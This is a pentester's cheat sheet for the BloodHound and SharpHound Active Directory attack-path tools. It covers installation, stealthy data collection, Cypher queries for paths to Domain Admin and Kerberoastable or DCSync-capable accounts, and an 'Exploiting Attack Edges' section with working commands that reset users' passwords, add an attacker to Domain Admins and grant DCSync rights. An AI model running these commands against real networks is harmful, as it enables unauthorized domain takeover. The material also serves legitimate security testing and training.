# 🩸 BloodHound - Active Directory Attack Path Visualization

```
  ██████╗ ██╗      ██████╗  ██████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗ 
  ██╔══██╗██║     ██╔═══██╗██╔═══██╗██╔══██╗██║  ██║██╔═══██╗██║   ██║████╗  ██║██╔══██╗
  ██████╔╝██║     ██║   ██║██║   ██║██║  ██║███████║██║   ██║██║   ██║██╔██╗ ██║██║  ██║
  ██╔══██╗██║     ██║   ██║██║   ██║██║  ██║██╔══██║██║   ██║██║   ██║██║╚██╗██║██║  ██║
  ██████╔╝███████╗╚██████╔╝╚██████╔╝██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝
  ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝ 
                        AD Attack Path Visualization
```

<p align="center">
  <img src="https://img.shields.io/badge/BloodHound-Active_Directory-red?style=for-the-badge" alt="BloodHound">
  <img src="https://img.shields.io/badge/Attack_Paths-blue?style=for-the-badge" alt="Attack Paths">
  <img src="https://img.shields.io/badge/Graph_Database-green?style=for-the-badge" alt="Graph">
</p>

---

## 📋 Table of Contents

- [What is BloodHound](#-what-is-bloodhound)
- [Installation](#-installation)
- [SharpHound Collection](#-sharphound-collection)
- [Using BloodHound GUI](#-using-bloodhound-gui)
- [Built-in Queries](#-built-in-queries)
- [Custom Cypher Queries](#-custom-cypher-queries)
- [Attack Path Analysis](#-attack-path-analysis)
- [BloodHound CE](#-bloodhound-ce)
- [Quick Reference](#-quick-reference)

---

## 🎯 What is BloodHound

**BloodHound** uses graph theory to reveal hidden attack paths in Active Directory. It visualizes:

- 🔗 **Attack Paths** - Routes to Domain Admin
- 👤 **User Relationships** - Group memberships, sessions
- 💻 **Computer Trust** - Admin rights, sessions
- 🔓 **Misconfigurations** - Exploitable permissions
- 🎯 **High-Value Targets** - Critical accounts

### Components

| Component | Description |
|-----------|-------------|
| **BloodHound** | GUI for visualization (Neo4j-based) |
| **SharpHound** | Data collector (.exe or .ps1) |
| **Neo4j** | Graph database backend |
| **BloodHound CE** | New cloud/enterprise edition |

---

## 🚀 Installation

### Kali Linux

```bash
# Install BloodHound
sudo apt update
sudo apt install bloodhound

# Install Neo4j
sudo apt install neo4j

# Start Neo4j
sudo neo4j start

# Access Neo4j browser: http://localhost:7474
# Default creds: neo4j / neo4j (change on first login)

# Start BloodHound
bloodhound
```

### Windows

```powershell
# Download from GitHub releases
https://github.com/BloodHoundAD/BloodHound/releases

# Install Neo4j Community Edition
https://neo4j.com/download/

# Start Neo4j
# Run as administrator and start service

# Run BloodHound.exe
```

### Docker (Recommended)

```bash
# Neo4j with BloodHound-ready config
docker run -d \
  --name neo4j \
  -p 7474:7474 -p 7687:7687 \
  -e NEO4J_AUTH=neo4j/bloodhound \
  neo4j:4.4

# Wait for startup, then run BloodHound
bloodhound
```

---

## 📡 SharpHound Collection

### Download SharpHound

```bash
# From BloodHound releases
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors

# Files:
# - SharpHound.exe (standalone)
# - SharpHound.ps1 (PowerShell)
```

### Basic Collection

```powershell
# Run SharpHound (default - all collection methods)
.\SharpHound.exe

# Specify domain
.\SharpHound.exe -d domain.local

# Specify output
.\SharpHound.exe -o C:\Temp\

# PowerShell version
Import-Module .\SharpHound.ps1
Invoke-BloodHound
```

### Collection Methods

```powershell
# All collection methods
.\SharpHound.exe -c All

# Specific methods
.\SharpHound.exe -c Default
.\SharpHound.exe -c Group
.\SharpHound.exe -c Session
.\SharpHound.exe -c Trusts
.\SharpHound.exe -c ACL
.\SharpHound.exe -c Container
.\SharpHound.exe -c RDP
.\SharpHound.exe -c DCOM
.\SharpHound.exe -c PSRemote
.\SharpHound.exe -c LocalAdmin
.\SharpHound.exe -c LocalGroup
.\SharpHound.exe -c SPNTargets
.\SharpHound.exe -c DCOnly
```

### Collection Method Details

| Method | Description | Noise |
|--------|-------------|-------|
| Default | Group, LocalAdmin, Session, Trusts | Low |
| All | Everything | High |
| Session | Logged-on users | Medium |
| LocalGroup | Local group members | Medium |
| ACL | ACL permissions | Low |
| DCOnly | DC-only collection | Very Low |
| Group | Group memberships | Low |
| Trusts | Domain trusts | Low |

### Stealth Collection

```powershell
# Stealth mode (slower, less noise)
.\SharpHound.exe -c DCOnly
.\SharpHound.exe --stealth

# No DNS resolution
.\SharpHound.exe --skipdns

# Delay between requests
.\SharpHound.exe --throttle 1000
```

### Loop Collection (Sessions)

```powershell
# Collect sessions over time
.\SharpHound.exe -c Session --loop --loopduration 02:00:00

# Loop with interval
.\SharpHound.exe -c Session --loop --loopinterval 00:05:00
```

### From Linux (bloodhound.py)

```bash
# Install
pip install bloodhound

# Run collection
bloodhound-python -u user -p 'password' -d domain.local -ns 10.10.10.1 -c All

# With hash
bloodhound-python -u user --hashes :NTLMHASH -d domain.local -c All
```

---

## 🖥️ Using BloodHound GUI

### Start BloodHound

```bash
# 1. Start Neo4j
sudo neo4j start

# 2. Wait for Neo4j (check http://localhost:7474)

# 3. Start BloodHound
bloodhound

# 4. Login
# URL: bolt://localhost:7687
# Username: neo4j
# Password: (your password)
```

### Import Data

```
1. Click "Upload Data" button (folder icon)
2. Select .zip file from SharpHound
3. Wait for import to complete
4. Data appears in graph
```

### Interface Overview

| Section | Description |
|---------|-------------|
| **Search** | Find users, computers, groups |
| **Analysis** | Pre-built queries |
| **Filters** | Edge/node visibility |
| **Graph** | Visual representation |
| **Node Info** | Details on selected item |

### Navigation

```
- Left-click: Select node
- Right-click: Context menu
- Scroll: Zoom in/out
- Drag: Pan view
- Ctrl+Click: Add to selection
```

---

## 🔍 Built-in Queries

### Domain Information

```
- Find all Domain Admins
- Find all Domain Controllers
- Find high value targets
- Map Domain Trusts
```

### Shortest Paths

```
- Shortest Paths to Domain Admins
- Shortest Path from Owned Principals
- Shortest Path to High Value Targets
- Shortest Path to Unconstrained Delegation
```

### Kerberos

```
- Find Kerberoastable Accounts
- Find AS-REP Roastable Users
- Shortest Path from Kerberoastable Users
- Find Principals with Unconstrained Delegation
```

### ACL Analysis

```
- Find Principals with DCSync Rights
- Find Dangerous Rights for Domain Users
- Find Users with Foreign Domain Group Membership
```

### Computers

```
- Find Computers with Unsupported OS
- Find Computers where Domain Users are Local Admin
- Find Computers with Sessions of High Value Users
```

### GPO

```
- Find all GPO Owned by Owned Principals
- Find GPO Affecting High Value Targets
```

---

## 📝 Custom Cypher Queries

### Basic Queries

```cypher
// Find all users
MATCH (u:User) RETURN u

// Find all computers
MATCH (c:Computer) RETURN c

// Find all Domain Admins
MATCH (g:Group {name: "DOMAIN ADMINS@DOMAIN.LOCAL"})
MATCH (u:User)-[:MemberOf*1..]->(g)
RETURN u.name

// Find all Domain Controllers
MATCH (c:Computer)-[:MemberOf*1..]->(g:Group)
WHERE g.name CONTAINS "DOMAIN CONTROLLERS"
RETURN c.name
```

### Session Queries

```cypher
// Find where Domain Admins have sessions
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
MATCH (c:Computer)-[:HasSession]->(u)
RETURN u.name, c.name

// Find users with sessions on multiple computers
MATCH (c:Computer)-[:HasSession]->(u:User)
WITH u, COUNT(c) as sessions
WHERE sessions > 5
RETURN u.name, sessions
ORDER BY sessions DESC
```

### Path Queries

```cypher
// Shortest path to Domain Admin
MATCH p=shortestPath(
  (u:User {name:"TARGETUSER@DOMAIN.LOCAL"})
  -[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
)
RETURN p

// All paths to Domain Admin (limit 10)
MATCH p=(u:User)-[*1..5]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
RETURN p LIMIT 10

// Paths from owned principals
MATCH p=shortestPath(
  (u {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
)
RETURN p
```

### ACL Queries

```cypher
// Users with DCSync rights
MATCH (u)-[:GetChanges]->(d:Domain)
MATCH (u)-[:GetChangesAll]->(d)
RETURN u.name

// Users who can reset passwords
MATCH (u:User)-[:ForceChangePassword]->(t:User)
RETURN u.name, t.name

// Users with GenericAll on computers
MATCH (u:User)-[:GenericAll]->(c:Computer)
RETURN u.name, c.name
```

### Kerberos Queries

```cypher
// Kerberoastable users with path to DA
MATCH (u:User {hasspn:true})
MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN u.name, LENGTH(p)

// AS-REP roastable users
MATCH (u:User {dontreqpreauth:true})
RETURN u.name

// Unconstrained delegation computers
MATCH (c:Computer {unconstraineddelegation:true})
RETURN c.name
```

### High Value Targets

```cypher
// Mark high value targets
MATCH (u:User {name:"TARGETUSER@DOMAIN.LOCAL"})
SET u.highvalue = true

// Find paths to high value targets
MATCH p=shortestPath(
  (u:User)-[*1..]->(t {highvalue:true})
)
RETURN p
```

---

## 🎯 Attack Path Analysis

### Finding Attack Paths

```
1. Search for starting node (compromised user)
2. Right-click → "Mark as Owned"
3. Run query: "Shortest Path from Owned Principals"
4. Analyze path edges
```

### Common Attack Edges

| Edge | Attack Method |
|------|---------------|
| **MemberOf** | Group membership |
| **AdminTo** | Local admin rights |
| **HasSession** | Credential harvesting |
| **CanRDP** | RDP access |
| **CanPSRemote** | PowerShell remoting |
| **ExecuteDCOM** | DCOM execution |
| **GenericAll** | Full control |
| **GenericWrite** | Modify object |
| **WriteOwner** | Change owner |
| **WriteDacl** | Modify ACL |
| **ForceChangePassword** | Reset password |
| **AddMember** | Add to group |
| **AllExtendedRights** | DCSync, etc. |
| **GetChanges** | DCSync (part 1) |
| **GetChangesAll** | DCSync (part 2) |

### Exploiting Attack Edges

#### GenericAll on User

```powershell
# Reset password
net user targetuser NewP@ssw0rd /domain

# Or with PowerView
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd' -AsPlainText -Force)
```

#### GenericAll on Computer

```powershell
# Resource-based constrained delegation attack
# Use Rubeus + PowerMad
```

#### ForceChangePassword

```powershell
# Reset password
net user targetuser NewP@ssw0rd /domain
```

#### AddMember

```powershell
# Add user to group
net group "Domain Admins" attackeruser /add /domain

# Or with PowerView
Add-DomainGroupMember -Identity "Domain Admins" -Members "attackeruser"
```

#### WriteDacl

```powershell
# Add DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attackeruser -Rights DCSync
```

---

## 🆕 BloodHound CE

### About BloodHound CE

**BloodHound Community Edition** is the new version:
- Modern web-based UI
- PostgreSQL backend (not Neo4j)
- REST API
- Improved performance

### Installation

```bash
# Docker Compose (recommended)
curl -L https://ghst.ly/getbhce | docker compose -f - up

# Access: http://localhost:8080
# Default: admin / (check docker logs)
```

### SharpHound for CE

```powershell
# Download CE-compatible collector
# From BloodHound CE releases

# Run collection (same syntax)
.\SharpHound.exe -c All
```

---

## 📊 Quick Reference

### SharpHound Commands

| Command | Description |
|---------|-------------|
| `.\SharpHound.exe` | Default collection |
| `.\SharpHound.exe -c All` | All methods |
| `.\SharpHound.exe -c DCOnly` | DC only (stealth) |
| `.\SharpHound.exe -c Session --loop` | Session loop |
| `.\SharpHound.exe -d domain.local` | Specify domain |
| `.\SharpHound.exe --stealth` | Stealth mode |

### Common Queries

| Query | Purpose |
|-------|---------|
| Find all Domain Admins | Identify DA members |
| Shortest Path to DA | Find attack path |
| Kerberoastable Users | Find SPNs to roast |
| AS-REP Roastable | No preauth users |
| Unconstrained Delegation | Delegation abuse |
| DCSync Rights | Find DCSync principals |

### Analysis Workflow

```
1. Collect with SharpHound
2. Import to BloodHound
3. Mark owned principals
4. Run "Shortest Path from Owned"
5. Analyze attack edges
6. Execute attacks
7. Mark new owned principals
8. Repeat
```

### Key Files

```
SharpHound output:
- *_BloodHound.zip (JSON data)
- computers.json
- users.json
- groups.json
- domains.json
- sessions.json
- ous.json
- gpos.json
- containers.json
```

---

## 📚 Resources

- [BloodHound GitHub](https://github.com/BloodHoundAD/BloodHound)
- [SharpHound](https://github.com/BloodHoundAD/SharpHound)
- [BloodHound Docs](https://bloodhound.readthedocs.io/)
- [bloodhound.py](https://github.com/fox-it/BloodHound.py)

### Related Cheatsheets
- [Mimikatz](../Mimikatz/README.md)
- [PowerShell](../PowerShell/README.md)
- [Windows PrivEsc](../Windows-PrivEsc/README.md)

---

<p align="center">
  <b>🩸 Find Your Path to Domain Admin!</b><br>
  <i>BloodHound - Every AD pentester's best friend</i>
</p>
